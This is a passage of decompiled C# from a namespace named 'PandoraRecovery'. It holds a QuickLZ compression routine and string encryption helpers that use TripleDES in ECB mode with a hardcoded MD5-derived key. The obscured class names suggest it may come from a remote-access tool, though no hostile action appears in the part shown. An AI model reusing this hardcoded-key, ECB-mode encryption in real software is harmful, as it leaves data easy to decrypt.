				dst[0] = (byte)(2 | (compressible ? 1 : 0));
				int num = 0;
				dst[num] |= (byte)(level << 2);
				int num2 = 0;
				dst[num2] |= 64;
				int num3 = 0;
				dst[num3] |= 0;
				PandoraRecovery.Copikolo.fast_write(dst, 1, size_decompressed, 4);
				PandoraRecovery.Copikolo.fast_write(dst, 5, size_compressed, 4);
			}

			// Token: 0x060000B2 RID: 178 RVA: 0x00007AA4 File Offset: 0x00005CA4
			public static byte[] compress(byte[] source, int level)
			{
				int i = 0;
				int num = 13;
				uint num2 = 2147483648U;
				int i2 = 9;
				byte[] array = new byte[source.Length + 400];
				int[] array2 = new int[4096];
				byte[] array3 = new byte[4096];
				int num3 = 0;
				int num4 = source.Length - 6 - 4 - 1;
				int num5 = 0;
				if (level != 1 && level != 3)
				{
					throw new ArgumentException("C# version only supports level 1 and 3");
				}
				int[,] array4;
				if (level == 1)
				{
					array4 = new int[4096, 1];
				}
				else
				{
					array4 = new int[4096, 16];
				}
				if (source.Length == 0)
				{
					return new byte[0];
				}
				if (i <= num4)
				{
					num3 = ((int)source[i] | (int)source[i + 1] << 8 | (int)source[i + 2] << 16);
				}
				byte[] array5;
				while (i <= num4)
				{
					if ((num2 & 1U) == 1U)
					{
						if (i > source.Length >> 1 && num > i - (i >> 5))
						{
							array5 = new byte[source.Length + 9];
							PandoraRecovery.Copikolo.write_header(array5, level, false, source.Length, source.Length + 9);
							Array.Copy(source, 0, array5, 9, source.Length);
							return array5;
						}
						PandoraRecovery.Copikolo.fast_write(array, i2, (int)(num2 >> 1 | 2147483648U), 4);
						i2 = num;
						num += 4;
						num2 = 2147483648U;
					}
					if (level == 1)
					{
						int num6 = (num3 >> 12 ^ num3) & 4095;
						int num7 = array4[num6, 0];
						int num8 = array2[num6] ^ num3;
						array2[num6] = num3;
						array4[num6, 0] = i;
						if (num8 == 0 && array3[num6] != 0 && (i - num7 > 2 || (i == num7 + 1 && num5 >= 3 && i > 3 && source[i] == source[i - 3] && source[i] == source[i - 2] && source[i] == source[i - 1] && source[i] == source[i + 1] && source[i] == source[i + 2])))
						{
							num2 = (num2 >> 1 | 2147483648U);
							if (source[num7 + 3] != source[i + 3])
							{
								int num9 = 1 | num6 << 4;
								array[num] = (byte)num9;
								array[num + 1] = (byte)(num9 >> 8);
								i += 3;
								num += 2;
							}
							else
							{
								int num10 = i;
								int num11 = (source.Length - 4 - i + 1 - 1 > 255) ? 255 : (source.Length - 4 - i + 1 - 1);
								i += 4;
								if (source[num7 + i - num10] == source[i])
								{
									i++;
									if (source[num7 + i - num10] == source[i])
									{
										i++;
										while (source[num7 + (i - num10)] == source[i] && i - num10 < num11)
										{
											i++;
										}
									}
								}
								int num12 = i - num10;
								num6 <<= 4;
								if (num12 < 18)
								{
									int num13 = num6 | num12 - 2;
									array[num] = (byte)num13;
									array[num + 1] = (byte)(num13 >> 8);
									num += 2;
								}
								else
								{
									PandoraRecovery.Copikolo.fast_write(array, num, num6 | num12 << 16, 3);
									num += 3;
								}
							}
							num3 = ((int)source[i] | (int)source[i + 1] << 8 | (int)source[i + 2] << 16);
							num5 = 0;
						}
						else
						{
							num5++;
							array3[num6] = 1;
							array[num] = source[i];
							num2 >>= 1;
							i++;
							num++;
							num3 = ((num3 >> 8 & 65535) | (int)source[i + 2] << 16);
						}
					}
					else
					{
						num3 = ((int)source[i] | (int)source[i + 1] << 8 | (int)source[i + 2] << 16);
						int num14 = (source.Length - 4 - i + 1 - 1 > 255) ? 255 : (source.Length - 4 - i + 1 - 1);
						int num15 = (num3 >> 12 ^ num3) & 4095;
						byte b = array3[num15];
						int num16 = 0;
						int num17 = 0;
						int num18 = 0;
						int num19;
						while (num18 < 16 && (int)b > num18)
						{
							num19 = array4[num15, num18];
							if ((byte)num3 == source[num19] && (byte)(num3 >> 8) == source[num19 + 1] && (byte)(num3 >> 16) == source[num19 + 2] && num19 < i - 2)
							{
								int num20 = 3;
								while (source[num19 + num20] == source[i + num20] && num20 < num14)
								{
									num20++;
								}
								if (num20 > num16 || (num20 == num16 && num19 > num17))
								{
									num17 = num19;
									num16 = num20;
								}
							}
							num18++;
						}
						num19 = num17;
						array4[num15, (int)(b & 15)] = i;
						b += 1;
						array3[num15] = b;
						if (num16 >= 3 && i - num19 < 131071)
						{
							int num21 = i - num19;
							for (int j = 1; j < num16; j++)
							{
								num3 = ((int)source[i + j] | (int)source[i + j + 1] << 8 | (int)source[i + j + 2] << 16);
								num15 = ((num3 >> 12 ^ num3) & 4095);
								byte[] array6 = array3;
								int num22 = num15;
								byte b2 = array6[num22];
								array6[num22] = b2 + 1;
								b = b2;
								array4[num15, (int)(b & 15)] = i + j;
							}
							i += num16;
							num2 = (num2 >> 1 | 2147483648U);
							if (num16 == 3 && num21 <= 63)
							{
								PandoraRecovery.Copikolo.fast_write(array, num, num21 << 2, 1);
								num++;
							}
							else if (num16 == 3 && num21 <= 16383)
							{
								PandoraRecovery.Copikolo.fast_write(array, num, num21 << 2 | 1, 2);
								num += 2;
							}
							else if (num16 <= 18 && num21 <= 1023)
							{
								PandoraRecovery.Copikolo.fast_write(array, num, num16 - 3 << 2 | num21 << 6 | 2, 2);
								num += 2;
							}
							else if (num16 <= 33)
							{
								PandoraRecovery.Copikolo.fast_write(array, num, num16 - 2 << 2 | num21 << 7 | 3, 3);
								num += 3;
							}
							else
							{
								PandoraRecovery.Copikolo.fast_write(array, num, num16 - 3 << 7 | num21 << 15 | 3, 4);
								num += 4;
							}
							num5 = 0;
						}
						else
						{
							array[num] = source[i];
							num2 >>= 1;
							i++;
							num++;
						}
					}
				}
				while (i <= source.Length - 1)
				{
					if ((num2 & 1U) == 1U)
					{
						PandoraRecovery.Copikolo.fast_write(array, i2, (int)(num2 >> 1 | 2147483648U), 4);
						i2 = num;
						num += 4;
						num2 = 2147483648U;
					}
					array[num] = source[i];
					i++;
					num++;
					num2 >>= 1;
				}
				while ((num2 & 1U) != 1U)
				{
					num2 >>= 1;
				}
				PandoraRecovery.Copikolo.fast_write(array, i2, (int)(num2 >> 1 | 2147483648U), 4);
				PandoraRecovery.Copikolo.write_header(array, level, true, source.Length, num);
				array5 = new byte[num];
				Array.Copy(array, array5, num);
				return array5;
			}

			// Token: 0x060000B3 RID: 179 RVA: 0x000080A0 File Offset: 0x000062A0
			private static void fast_write(byte[] a, int i, int value, int numbytes)
			{
				for (int j = 0; j < numbytes; j++)
				{
					a[i + j] = (byte)(value >> j * 8);
				}
			}

			// Token: 0x060000B4 RID: 180 RVA: 0x000080C8 File Offset: 0x000062C8
			public static byte[] decompress(byte[] source)
			{
				int num = PandoraRecovery.Copikolo.sizeDecompressed(source);
				int num2 = PandoraRecovery.Copikolo.headerLen(source);
				int i = 0;
				uint num3 = 1U;
				byte[] array = new byte[num];
				int[] array2 = new int[4096];
				byte[] array3 = new byte[4096];
				int num4 = num - 6 - 4 - 1;
				int j = -1;
				uint num5 = 0U;
				int num6 = source[0] >> 2 & 3;
				if (num6 != 1 && num6 != 3)
				{
					throw new ArgumentException("C# version only supports level 1 and 3");
				}
				if ((source[0] & 1) != 1)
				{
					byte[] array4 = new byte[num];
					Array.Copy(source, PandoraRecovery.Copikolo.headerLen(source), array4, 0, num);
					return array4;
				}
				for (;;)
				{
					if (num3 == 1U)
					{
						num3 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16 | (int)source[num2 + 3] << 24);
						num2 += 4;
						if (i <= num4)
						{
							if (num6 == 1)
							{
								num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16);
							}
							else
							{
								num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16 | (int)source[num2 + 3] << 24);
							}
						}
					}
					if ((num3 & 1U) == 1U)
					{
						num3 >>= 1;
						uint num8;
						uint num9;
						if (num6 == 1)
						{
							int num7 = (int)num5 >> 4 & 4095;
							num8 = (uint)array2[num7];
							if ((num5 & 15U) != 0U)
							{
								num9 = (num5 & 15U) + 2U;
								num2 += 2;
							}
							else
							{
								num9 = (uint)source[num2 + 2];
								num2 += 3;
							}
						}
						else
						{
							uint num10;
							if ((num5 & 3U) == 0U)
							{
								num10 = (num5 & 255U) >> 2;
								num9 = 3U;
								num2++;
							}
							else if ((num5 & 2U) == 0U)
							{
								num10 = (num5 & 65535U) >> 2;
								num9 = 3U;
								num2 += 2;
							}
							else if ((num5 & 1U) == 0U)
							{
								num10 = (num5 & 65535U) >> 6;
								num9 = (num5 >> 2 & 15U) + 3U;
								num2 += 2;
							}
							else if ((num5 & 127U) != 3U)
							{
								num10 = (num5 >> 7 & 131071U);
								num9 = (num5 >> 2 & 31U) + 2U;
								num2 += 3;
							}
							else
							{
								num10 = num5 >> 15;
								num9 = (num5 >> 7 & 255U) + 3U;
								num2 += 4;
							}
							num8 = (uint)((long)i - (long)((ulong)num10));
						}
						array[i] = array[(int)num8];
						array[i + 1] = array[(int)(num8 + 1U)];
						array[i + 2] = array[(int)(num8 + 2U)];
						int num11 = 3;
						while ((long)num11 < (long)((ulong)num9))
						{
							array[i + num11] = array[(int)(checked((IntPtr)(unchecked((ulong)num8 + (ulong)((long)num11)))))];
							num11++;
						}
						i += (int)num9;
						if (num6 == 1)
						{
							num5 = (uint)((int)array[j + 1] | (int)array[j + 2] << 8 | (int)array[j + 3] << 16);
							while ((long)j < (long)i - (long)((ulong)num9))
							{
								j++;
								int num7 = (int)((num5 >> 12 ^ num5) & 4095U);
								array2[num7] = j;
								array3[num7] = 1;
								num5 = (uint)((ulong)(num5 >> 8 & 65535U) | (ulong)((long)((long)array[j + 3] << 16)));
							}
							num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16);
						}
						else
						{
							num5 = (uint)((int)source[num2] | (int)source[num2 + 1] << 8 | (int)source[num2 + 2] << 16 | (int)source[num2 + 3] << 24);
						}
						j = i - 1;
					}
					else
					{
						if (i > num4)
						{
							break;
						}
						array[i] = source[num2];
						i++;
						num2++;
						num3 >>= 1;
						if (num6 == 1)
						{
							while (j < i - 3)
							{
								j++;
								int num12 = (int)array[j] | (int)array[j + 1] << 8 | (int)array[j + 2] << 16;
								int num7 = (num12 >> 12 ^ num12) & 4095;
								array2[num7] = j;
								array3[num7] = 1;
							}
							num5 = (uint)((ulong)(num5 >> 8 & 65535U) | (ulong)((long)((long)source[num2 + 2] << 16)));
						}
						else
						{
							num5 = (uint)((ulong)(num5 >> 8 & 65535U) | (ulong)((long)((long)source[num2 + 2] << 16)) | (ulong)((long)((long)source[num2 + 3] << 24)));
						}
					}
				}
				while (i <= num - 1)
				{
					if (num3 == 1U)
					{
						num2 += 4;
						num3 = 2147483648U;
					}
					array[i] = source[num2];
					i++;
					num2++;
					num3 >>= 1;
				}
				return array;
			}

			// Token: 0x0400007B RID: 123
			public const int QLZ_VERSION_MAJOR = 1;

			// Token: 0x0400007C RID: 124
			public const int QLZ_VERSION_MINOR = 5;

			// Token: 0x0400007D RID: 125
			public const int QLZ_VERSION_REVISION = 0;

			// Token: 0x0400007E RID: 126
			public const int QLZ_STREAMING_BUFFER = 0;

			// Token: 0x0400007F RID: 127
			public const int QLZ_MEMORY_SAFE = 0;

			// Token: 0x04000080 RID: 128
			private const int HASH_VALUES = 4096;

			// Token: 0x04000081 RID: 129
			private const int MINOFFSET = 2;

			// Token: 0x04000082 RID: 130
			private const int UNCONDITIONAL_MATCHLEN = 6;

			// Token: 0x04000083 RID: 131
			private const int UNCOMPRESSED_END = 4;

			// Token: 0x04000084 RID: 132
			private const int CWORD_LEN = 4;

			// Token: 0x04000085 RID: 133
			private const int DEFAULT_HEADERLEN = 9;

			// Token: 0x04000086 RID: 134
			private const int QLZ_POINTERS_1 = 1;

			// Token: 0x04000087 RID: 135
			private const int QLZ_POINTERS_3 = 16;
		}

		// Token: 0x02000027 RID: 39
		public static class Pikolo
		{
			// Token: 0x060000B5 RID: 181 RVA: 0x00008484 File Offset: 0x00006684
			public static string PikoloData(string Message)
			{
				UTF8Encoding utf8Encoding = new UTF8Encoding();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes("CqbkTHriRRbQjaArtJfF"));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] bytes = utf8Encoding.GetBytes(Message);
				byte[] inArray;
				try
				{
					inArray = tripleDESCryptoServiceProvider.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
				return Convert.ToBase64String(inArray);
			}

			// Token: 0x060000B6 RID: 182 RVA: 0x00008514 File Offset: 0x00006714
			public static string DePikoloData(string Message)
			{
				UTF8Encoding utf8Encoding = new UTF8Encoding();
				MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] key = md5CryptoServiceProvider.ComputeHash(utf8Encoding.GetBytes("CqbkTHriRRbQjaArtJfF"));
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				byte[] array = Convert.FromBase64String(Message);
				byte[] bytes;
				try
				{
					bytes = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array, 0, array.Length);
				}
				finally
				{
					tripleDESCryptoServiceProvider.Clear();
					md5CryptoServiceProvider.Clear();
				}
				return utf8Encoding.GetString(bytes);
			}
		}
	}
}
